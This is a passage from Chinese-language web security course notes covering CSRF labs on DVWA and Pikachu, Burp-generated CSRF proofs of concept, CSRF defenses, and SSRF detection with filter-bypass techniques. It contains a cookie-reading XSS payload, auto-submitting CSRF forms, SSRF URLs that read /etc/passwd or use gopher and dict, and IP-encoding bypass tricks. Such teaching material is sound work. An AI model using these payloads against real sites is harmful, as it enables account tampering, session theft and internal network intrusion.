<pre class="src src-sh">GET /vulnerabilities/csrf/?<span style="color: #a0522d;">password_new</span>=1&amp;<span style="color: #a0522d;">password_conf</span>=2&amp;<span style="color: #a0522d;">Change</span>=Change&amp;<span style="color: #a0522d;">user_token</span>=2a0648ccc3a31a2b080b1a723706ab5f HTTP/1.1
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'Change'</span> ] ) ) {
        // Check Anti-CSRF token
        checkToken( $<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'user_token'</span> ], $<span style="color: #a0522d;">_SESSION</span>[ <span style="color: #8b2252;">'session_token'</span> ],
        <span style="color: #8b2252;">'index.php'</span> );
        // Get input
        $<span style="color: #a0522d;">pass_new</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_new'</span> ];
        $<span style="color: #a0522d;">pass_conf</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_conf'</span> ];
        // Do the passwords match?
        <span style="color: #a020f0;">if</span>( $<span style="color: #a0522d;">pass_new</span> == $<span style="color: #a0522d;">pass_conf</span> ) {
                // They<span style="color: #a020f0;"> do</span>!
                $<span style="color: #a0522d;">pass_new</span> = mysql_real_escape_string( $<span style="color: #a0522d;">pass_new</span> );
                $<span style="color: #a0522d;">pass_new</span> = md5( $<span style="color: #a0522d;">pass_new</span> );
                // Update the database
                $<span style="color: #a0522d;">insert</span> = <span style="color: #8b2252;">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> .
                dvwaCurrentUser() <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">"';"</span>;
                $<span style="color: #a0522d;">result</span> = mysql_query( $<span style="color: #a0522d;">insert</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . mysql_error() <span style="color: #483d8b;">.</span>
                <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );
                // Feedback for the user
                <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
        } <span style="color: #a020f0;">else</span> {
                // Issue with passwords matching
                <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
        }
        mysql_close();
}
// Generate Anti-CSRF token
<span style="color: #0000ff;">generateSessionToken</span>();
?&gt;
</pre>
</div>

<p>
这个High安全等级主要是利用了DVWA的XSS漏洞和CSRF漏洞共同完成的，找到DVWA的XSS模块，通过XSS漏洞获取浏览器Cookie
</p>

<p>
1）利用XSS获取cookie
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">img</span> src=x OnerrOr=alert(document.cookie)&gt;
</pre>
</div>



<figure id="orgb103c6b">
<img src="./images/img_20230707_112241.png" alt="img_20230707_112241.png" width="50%">

</figure>

<p>
PHPSESSID=hrcmlfmsim5ut4699l9t39t0s0; security=low
</p>


<p>
实战中是攻击者在某个页面插入了 xss 漏洞代码获取了用户的 cookie 值发送给了攻击者
</p>

<p>
2）抓包修改密码
</p>



<figure id="org75ceea9">
<img src="./images/img_20230707_112315.png" alt="img_20230707_112315.png" width="50%">

</figure>

<p>
把安全等级改成 low 就不需要验证 token 了
</p>

<p>
实战中是攻击者拿到用户的 cookie，使用用户的 cookie ，反安全等级设置为 low，删除请求中的token，就能成功修改密码。
</p>
</div>
</div>
</div>
<div id="outline-container-h:e5431d54-cbb0-435c-8cb8-dab677adad1f" class="outline-3">
<h3 id="h:e5431d54-cbb0-435c-8cb8-dab677adad1f">Pikachu演示</h3>
<div class="outline-text-3" id="text-h:e5431d54-cbb0-435c-8cb8-dab677adad1f">
</div>
<div id="outline-container-h:e3164e3a-1104-41df-bd6b-cb1e08ea68be" class="outline-4">
<h4 id="h:e3164e3a-1104-41df-bd6b-cb1e08ea68be">电话地址修改 CSRF（GET）</h4>
<div class="outline-text-4" id="text-h:e3164e3a-1104-41df-bd6b-cb1e08ea68be">
<p>
一个登录表单，我们先进行登录。提示信息中给了我们用户名/密码
</p>

<p>
登录进去是一个可以修改个人信息的界面
</p>



<figure id="org322f298">
<img src="./images/img_20230707_112426.png" alt="img_20230707_112426.png" width="50%">

</figure>


<p>
在提交修改个人信息的时候，抓包看到下面内容
满足 csrf 的攻击条件：
</p>
<ul class="org-ul">
<li>修改用户个人信息</li>
<li>基于 cookie 的会话处理</li>
<li>没有不可预测的请求条件</li>
</ul>

<p>
复制出信息：
</p>
<div class="org-src-container">
<pre class="src src-sh">GET /vul/csrf/csrfget/csrf_get_edit.php?
<span style="color: #a0522d;">sex</span>=man&amp;<span style="color: #a0522d;">phonenum</span>=11111111111&amp;<span style="color: #a0522d;">add</span>=beijing&amp;<span style="color: #a0522d;">email</span>=xxxx%40xxx.com&amp;<span style="color: #a0522d;">submit</span>=submit
HTTP/1.1
</pre>
</div>

<p>
修改电话号码与地址，例如：
</p>

<div class="org-src-container">
<pre class="src src-sh">GET /vul/csrf/csrfget/csrf_get_edit.php?
<span style="color: #a0522d;">sex</span>=man&amp;<span style="color: #a0522d;">phonenum</span>=22222222222&amp;<span style="color: #a0522d;">add</span>=shanghai&amp;<span style="color: #a0522d;">email</span>=xxx%40xxx.com&amp;<span style="color: #a0522d;">submit</span>=submit
HTTP/1.
</pre>
</div>

<p>
然后添加补全URL地址，发送给被攻击者kobe（在另一个浏览器登录kobe账号）
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8000/vul/csrf/csrfget/csrf_get_edit.php?
<span style="color: #a0522d;">sex</span>=man&amp;<span style="color: #a0522d;">phonenum</span>=22222222222&amp;<span style="color: #a0522d;">add</span>=shanghai&amp;<span style="color: #a0522d;">email</span>=xxx%40xxx.com&amp;<span style="color: #a0522d;">submit</span>=submit
</pre>
</div>


<p>
如果被攻击者kobe此时登录状态或cookie/session没有过期，则他的信息被修改。
</p>

<p>
可以看到，电话号码和地址都被修改。
</p>
</div>
</div>
<div id="outline-container-h:7cbe590a-e82b-44de-8b07-007809824205" class="outline-4">
<h4 id="h:7cbe590a-e82b-44de-8b07-007809824205">钓鱼攻击 CSRF（POST）</h4>
<div class="outline-text-4" id="text-h:7cbe590a-e82b-44de-8b07-007809824205">
<p>
当请求从get变为post，我们不能直接从URL里面进行修改
</p>



<figure id="org4e5da92">
<img src="./images/img_20230707_112851.png" alt="img_20230707_112851.png" width="50%">

</figure>

<p>
这时我们可以制作一个链接给用户，使他直接发送URL请求。
</p>

<p>
链接代码:
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">html</span>&gt;

  &lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">script</span>&gt;
      window.onload = function() {
        document.getElementById("postsubmit").click();
      }
    &lt;/<span style="color: #0000ff;">script</span>&gt;
  &lt;/<span style="color: #0000ff;">head</span>&gt;

  &lt;<span style="color: #0000ff;">body</span>&gt;
    &lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"http://127.0.0.1:8000/vul/csrf/csrfpost/csrf_post_edit.php"</span>&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"sex"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"sex"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"girl"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"phonenum"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"phonenum"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"100000002"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"add"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"add"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"hacker"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"email"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"email"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"lucy@pikachu.com"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"postsubmit"</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"submit"</span> /&gt;
    &lt;/<span style="color: #0000ff;">form</span>&gt;
  &lt;/<span style="color: #0000ff;">body</span>&gt;

&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<p>
先选择一个用户进行登录
</p>

<p>
当登录后的用户点击我们伪造的链接，可以看到用户的个人信息已经被修改
</p>

<p>
重新登录该用户，发现信息确实被修改和保存
</p>

<p>
在实际当中我们可能把一个图片发送给用户，引导用户访问图片链接的恶意网站。
</p>
</div>
</div>
</div>
<div id="outline-container-h:194f19e9-6436-46ce-a1e9-e0852c1f9830" class="outline-3">
<h3 id="h:194f19e9-6436-46ce-a1e9-e0852c1f9830">使用Burp生成CSRF利用POC</h3>
<div class="outline-text-3" id="text-h:194f19e9-6436-46ce-a1e9-e0852c1f9830">
<ul class="org-ul">
<li>在 Burp Suite Professional 中的任意位置选择需要测试或利用的请求。</li>
<li>从右键单击上下文菜单中，选择 参与工具 &#x2013;&gt; 生成 CSRF PoC。</li>
<li>Burp Suite 将生成一些 HTML 来触发选定的请求（减去 cookie，它将由受害者的浏览器自动添加）。</li>
<li>可以调整 CSRF PoC 生成器中的各种选项，以微调攻击的各个方面。可能需要在一些不寻常的情况下执行此操作以处理请求的古怪功能。</li>
<li>将生成的 HTML 复制到网页中，再登录到易受攻击网站的浏览器中查看，测试是否成功发出了预期的请求以及是否发生了所需的操作。</li>
</ul>



<figure id="org94df5ed">
<img src="./images/img_20230707_113110.png" alt="img_20230707_113110.png" width="50%">

</figure>



<figure id="org24db1f9">
<img src="./images/img_20230707_113147.png" alt="img_20230707_113147.png" width="50%">

</figure>

<p>
可以选择自动包含脚本
</p>
<ul class="org-ul">
<li>option 中勾选 Include auto-submit script</li>
<li>Regenerate 重新生成 html</li>
</ul>



<figure id="orgd6ccab5">
<img src="./images/img_20230707_113214.png" alt="img_20230707_113214.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">html</span>&gt;
  <span style="color: #b22222;">&lt;!-- </span><span style="color: #b22222;">CSRF PoC - generated by Burp Suite Professional</span><span style="color: #b22222;"> --&gt;</span>
  &lt;<span style="color: #0000ff;">body</span>&gt;
  &lt;<span style="color: #0000ff;">script</span>&gt;history.pushState('', '', '/')&lt;/<span style="color: #0000ff;">script</span>&gt;
    &lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"http://124.222.171.19:8083/vul/csrf/csrfpost/csrf_post_edit.php"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"POST"</span>&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"sex"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"a"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"phonenum"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"a"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"add"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"a"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"email"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"a"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"submit"</span> /&gt;
      &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"Submit request"</span> /&gt;
    &lt;/<span style="color: #0000ff;">form</span>&gt;
    &lt;<span style="color: #0000ff;">script</span>&gt;
      document.forms[0].submit();
    &lt;/<span style="color: #0000ff;">script</span>&gt;
  &lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:340bafd5-8679-428f-a318-afb686edc1e6" class="outline-3">
<h3 id="h:340bafd5-8679-428f-a318-afb686edc1e6">防御CSRF漏洞</h3>
<div class="outline-text-3" id="text-h:340bafd5-8679-428f-a318-afb686edc1e6">
<p>
防御 CSRF 攻击的最可靠方法是在相关请求中包含CSRF Token：
</p>
<ul class="org-ul">
<li>对于一般的会话令牌，是不可预测的</li>
<li>绑定到用户的会话
<ul class="org-ul">
<li>前端分配给用户 token 值后，后端还有个会话的部分，两者作比对</li>
</ul></li>
<li>在执行相关操作之前，在每种情况下都经过严格验证</li>
</ul>
</div>
<div id="outline-container-h:fa43e364-5c74-40db-bdb8-688fa0d7e054" class="outline-4">
<h4 id="h:fa43e364-5c74-40db-bdb8-688fa0d7e054">验证 HTTP Referer 字段</h4>
<div class="outline-text-4" id="text-h:fa43e364-5c74-40db-bdb8-688fa0d7e054">
<p>
1）拿到referer
2）分割出referer中的域名
3）根据后缀匹配域名是否是可信域
</p>

<p>
根据 HTTP 协议，在 HTTP 头中有一个字段叫Referer，它记录了该 HTTP 请求的来源地址。因此，要防御 CSRF 攻击，网站可以对关键功能的请求验证其 Referer 值，如果是本网站的域名，则说明该请求是来自于网站本身，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
</p>

<p>
但些浏览器是可以改写 Referer 的，抓包工具也可以
</p>
</div>
</div>
<div id="outline-container-h:ea86db02-cfe1-40a6-a2b0-77572fa578f2" class="outline-4">
<h4 id="h:ea86db02-cfe1-40a6-a2b0-77572fa578f2">在请求地址中添加 token 并验证</h4>
<div class="outline-text-4" id="text-h:ea86db02-cfe1-40a6-a2b0-77572fa578f2">
<p>
CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。
</p>

<p>
要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
</p>

<p>
比如 dvwa 登录界面就有隐藏的 token
</p>
</div>
</div>
<div id="outline-container-h:fd6e34e0-d96d-4e83-a72d-34a2617de1cb" class="outline-4">
<h4 id="h:fd6e34e0-d96d-4e83-a72d-34a2617de1cb">添加验证码</h4>
<div class="outline-text-4" id="text-h:fd6e34e0-d96d-4e83-a72d-34a2617de1cb">
<p>
验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。
</p>

<p>
CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:a3723ed5-beb3-4860-b8e1-aa044bbd90b0" class="outline-2">
<h2 id="h:a3723ed5-beb3-4860-b8e1-aa044bbd90b0">SSRF 漏洞</h2>
<div class="outline-text-2" id="text-h:a3723ed5-beb3-4860-b8e1-aa044bbd90b0">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>SSRF 原理及寻找方法</li>
<li>SSRF 攻防实战及防范方法</li>
</ul>
</div>
<div id="outline-container-h:c189b0d4-aaa0-4815-8190-04279420b11f" class="outline-3">
<h3 id="h:c189b0d4-aaa0-4815-8190-04279420b11f">漏洞简介</h3>
<div class="outline-text-3" id="text-h:c189b0d4-aaa0-4815-8190-04279420b11f">
<p>
CSRF：客户端请求伪造，攻击者伪造一个请求发送给客户端让用户去访问。
</p>

<p>
SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。
</p>



<figure id="orga6bba38">
<img src="./images/img_20230717_142934.png" alt="img_20230717_142934.png" width="50%">

</figure>
</div>
<div id="outline-container-h:141e9214-d0d5-4af4-8a16-c48bc5eccb71" class="outline-4">
<h4 id="h:141e9214-d0d5-4af4-8a16-c48bc5eccb71">漏洞原理</h4>
<div class="outline-text-4" id="text-h:141e9214-d0d5-4af4-8a16-c48bc5eccb71">
<p>
SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。
</p>

<p>
通过控制发起请求的Web服务器来当作跳板机攻击内网中其他服务。比如，通过控制前端的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。
</p>
</div>
</div>
<div id="outline-container-h:b1727c8c-65ae-4391-8ab6-058bff10eb3b" class="outline-4">
<h4 id="h:b1727c8c-65ae-4391-8ab6-058bff10eb3b">漏洞危害</h4>
<div class="outline-text-4" id="text-h:b1727c8c-65ae-4391-8ab6-058bff10eb3b">
<ol class="org-ol">
<li>扫描内网开放服务</li>
<li>向内部任意主机的任意端口发送payload来攻击内网服务</li>
<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
<li>攻击内网的web应用，例如直接SQL注入、XSS攻击等</li>
<li>利用file、gopher、dict协议读取本地文件、执行命令等</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:6b0224e7-57ec-4c7e-b9aa-af3d9a169eaf" class="outline-3">
<h3 id="h:6b0224e7-57ec-4c7e-b9aa-af3d9a169eaf">检测与绕过</h3>
<div class="outline-text-3" id="text-h:6b0224e7-57ec-4c7e-b9aa-af3d9a169eaf">
</div>
<div id="outline-container-h:c284bd59-9759-42b5-9cc3-8f2bff700461" class="outline-4">
<h4 id="h:c284bd59-9759-42b5-9cc3-8f2bff700461">漏洞检测</h4>
<div class="outline-text-4" id="text-h:c284bd59-9759-42b5-9cc3-8f2bff700461">
<p>
假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.com/image.php?<span style="color: #a0522d;">image</span>=http://www.xxc.com/a.jpg
</pre>
</div>

<p>
那么网站请求的大致步骤如下：
</p>

<ul class="org-ul">
<li>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前端显示。</li>
</ul>

<p>
这个过程中可能出现问题的点就在于访问请求发送到服务端的时候，图片加载请求是由服务端去加载的，而系统没有校验前端给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.com/image.php?<span style="color: #a0522d;">image</span>=http://127.0.0.1:22
</pre>
</div>

<p>
如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如
</p>

<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.com/image.php?<span style="color: #a0522d;">image</span>=file:///etc/passwd
http://www.xxx.com/image.php?<span style="color: #a0522d;">image</span>=dict://127.0.0.1:22/data:data2 (dict&#21487;&#20197;&#21521;&#26381;&#21153;&#31471; &#21475;&#35831;&#27714;data data2)
http://www.xxx.com/image.php?<span style="color: #a0522d;">image</span>=gopher://127.0.0.1:2233/_test (&#21521;2233&#31471;&#21475;&#21457;&#36865;&#25968; &#25454;test,&#21516;&#26679;&#21487;&#20197;&#21457;&#36865;POST&#35831;&#27714;)
......
</pre>
</div>

<p>
对于不同语言实现的Web系统，可以使用的协议也存在不同的差异，其中：
</p>

<ul class="org-ul">
<li>php：http、https、file、gopher、phar、dict、ftp、ssh、telnet&#x2026;</li>
<li>java：http、https、file、ftp、jar、netdoc、mailto&#x2026;</li>
</ul>

<p>
判断漏洞是否存在的重要前提是，请求是服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，不需要考虑SSRF。
</p>

<ul class="org-ul">
<li>www.xxx.com/index.php?page=/etc/passwd 文件包含，请求是客户端发起的</li>
<li>www.xxx.com/index.php?image=<a href="file:///d:/etc/passwd">file:///d:/etc/passwd</a> SSRF，客户端请求www.xxx.com，而/etc/passwd 资源是 www.xxx.com 所在服务器去请求的。</li>
</ul>

<p>
验证是否是文件包含还是SSRF：
</p>
<ul class="org-ul">
<li>自己搭建个服务器并有个静态文件 www.hack.com/a.jpg</li>
<li>地址放漏洞网站里，看自己服务器日志，访问源是自客户端ip就是文件包含，是网站出口Ip就是ssrf。
<ul class="org-ul">
<li>www.xxx.com/index.php?page=www.hack.com/a.jpg</li>
</ul></li>
</ul>

<p>
用扫描器就能扫出来。
</p>

<p>
比如：前端获取链接后，由JS来获取对应参数交由windows.location来处理相关的请求，或者加载到当前的iframe框架中（这就相当于是由浏览器发起请求），此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。
</p>
</div>
</div>
<div id="outline-container-h:5ac443cc-60ba-41b7-b575-180ba6b64ce6" class="outline-4">
<h4 id="h:5ac443cc-60ba-41b7-b575-180ba6b64ce6">漏洞出现点</h4>
<div class="outline-text-4" id="text-h:5ac443cc-60ba-41b7-b575-180ba6b64ce6">
<p>
<b>分享</b>
通过URL地址分享文章，例如如下地址：
</p>

<p>
<a href="http://share.xxx.com/index.php?url=http://127.0.0.1">http://share.xxx.com/index.php?url=http://127.0.0.1</a>
</p>

<p>
通过URL参数的获取来实现点击链接的时候跳转到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制，则可能存在SSRF漏洞。
</p>

<p>
<b>图片加载与下载</b>
</p>

<p>
通过URL地址加载或下载图片
</p>

<p>
<a href="http://image.xxx.com/image.php?image=http://127.0.0.1">http://image.xxx.com/image.php?image=http://127.0.0.1</a>
</p>

<p>
图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载本地图片到服务器内，还有一些采用加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF漏洞。
</p>

<p>
<b>图片、文章收藏功能</b>
</p>

<p>
<a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a>
</p>

<p>
例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存、收藏的返回信息。如果保存、收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF漏洞。
</p>

<p>
<b>利用参数中的关键字来查找</b>
</p>

<p>
例如以下的关键字：
</p>
<div class="org-src-container">
<pre class="src src-sh">share
wap
url
link
src
<span style="color: #483d8b;">source</span>
target
u
3g
display
sourceURl
imageURL
domain
...
</pre>
</div>
</div>
</div>
<div id="outline-container-h:4d9f1154-eee1-4d94-bc75-25668f5f25e6" class="outline-4">
<h4 id="h:4d9f1154-eee1-4d94-bc75-25668f5f25e6">漏洞绕过</h4>
<div class="outline-text-4" id="text-h:4d9f1154-eee1-4d94-bc75-25668f5f25e6">
<p>
部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：
</p>
</div>
<div id="outline-container-h:7f56542e-aa87-4dbb-931c-1d53c3396946" class="outline-5">
<h5 id="h:7f56542e-aa87-4dbb-931c-1d53c3396946">场景1：限制为 <a href="http://www.xxx.com">http://www.xxx.com</a> 域名时</h5>
<div class="outline-text-5" id="text-h:7f56542e-aa87-4dbb-931c-1d53c3396946">
<p>
可以尝试采用http基本身份认证的方式绕过，通过添加@来构造URL：<a href="http://www.xxx.com@www.xxc.com">http://www.xxx.com@www.xxc.com</a>。 在对@解析域名时，不同处理函数存在处理差异，例如：<a href="http://www.aaa.com@www.bbb.com@www.ccc.com">http://www.aaa.com@www.bbb.com@www.ccc.com</a>， 在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
</p>

<div class="org-src-container">
<pre class="src src-org">URL: &#32479;&#19968;&#36164;&#28304;&#23450;&#20301;&#31526;
- &#21253;&#21547;3&#37096;&#20998;&#65306; 
  - URL&#26041;&#26696;&#65306;scheme
  - &#26381;&#21153;&#22120;&#22320;&#22336;&#65306;ip:port
  - &#36164;&#28304;&#36335;&#24452;&#65306;

- &#22522;&#26412;&#35821;&#27861;&#65306;&#24314;&#31435;&#22312;&#30001;9&#20010;&#37096;&#20998;&#26500;&#25104;&#30340;&#36890;&#29992;&#26684;&#24335;&#19978;&#65306;
  &lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;

  - params: &#21442;&#25968;
    &#31034;&#20363;&#65306;<span style="color: #3a5fcd; text-decoration: underline;"><a href="http://www.bamaface.com/bbs/hello;gender=f">http://www.bamaface.com/bbs/hello;gender=f</a></span>
  - query: &#26597;&#35810;&#26631;&#20934;
    &#31034;&#20363;&#65306;<span style="color: #3a5fcd; text-decoration: underline;"><a href="http://www.bamaface.com/bbs/item.php?username=tom&amp;title=abc">http://www.bamaface.com/bbs/item.php?username=tom&amp;title=abc</a></span>
  - frag: &#29255;&#26029;&#65292;&#38170;&#23450;
    &#31034;&#20363;&#65306;<span style="color: #3a5fcd; text-decoration: underline;"><a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html-single/Installation_Guide/index.html#ch-Boot-x86">https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html-single/Installation_Guide/index.html#ch-Boot-x86</a></span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:24de6a99-2d4c-477e-801d-bb16e7d63a1b" class="outline-5">
<h5 id="h:24de6a99-2d4c-477e-801d-bb16e7d63a1b">场景2：限制请求IP不为内网地址</h5>
<div class="outline-text-5" id="text-h:24de6a99-2d4c-477e-801d-bb16e7d63a1b">
<p>
即限制访问所有内网IP，可采用短网址绕过，<a href="https://www.985.so/">短网址转换</a>。
</p>



<figure id="org32c3db2">
<img src="./images/img_20230717_144211.png" alt="img_20230717_144211.png" width="50%">

</figure>

<p>
也可以使用在线<a href="https://www.sojson.com/hexconvert.html">进制转换</a>, 127转换16进制为7f，系统中表示16进制前面要加0x，8进制前加0
</p>

<p>
可以将127.0.0.1采用进制转换
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
</p>

<p>
哪一种进制可以绕过需要我们进行尝试，和程序后端的处理逻辑有关系。
</p>

<div class="org-src-container">
<pre class="src src-sh">ping 0177.0.0.1
ping 0x7f.0.0.1
</pre>
</div>


<figure id="org43f0eff">
<img src="./images/img_20230717_150054.png" alt="img_20230717_150054.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:2cbd37a6-cb3d-44a6-b8b8-7428b6370020" class="outline-5">
<h5 id="h:2cbd37a6-cb3d-44a6-b8b8-7428b6370020">场景3：限制请求只为http协议</h5>
<div class="outline-text-5" id="text-h:2cbd37a6-cb3d-44a6-b8b8-7428b6370020">
<p>
采用302跳转，百度短地址，或者使用<a href="https://www.985.so/">短地址生成</a>
</p>
</div>
</div>
<div id="outline-container-h:e527c5de-e674-4205-a07e-6c7f0a957a35" class="outline-5">
<h5 id="h:e527c5de-e674-4205-a07e-6c7f0a957a35">场景4：利用句号绕过</h5>
<div class="outline-text-5" id="text-h:e527c5de-e674-4205-a07e-6c7f0a957a35">
<div class="org-src-container">
<pre class="src src-sh">127&#12290;0&#12290;0&#12290;1 &gt;&gt;&gt; 127.0.0.1
</pre>
</div>
<p>
在一些特殊场景下，能把句号识别成点的场景使用
</p>

<p>
其他绕过形式可以查看：<a href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html</a>
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-h:21195e03-244c-4a24-ac44-cda3adb25390" class="outline-3">
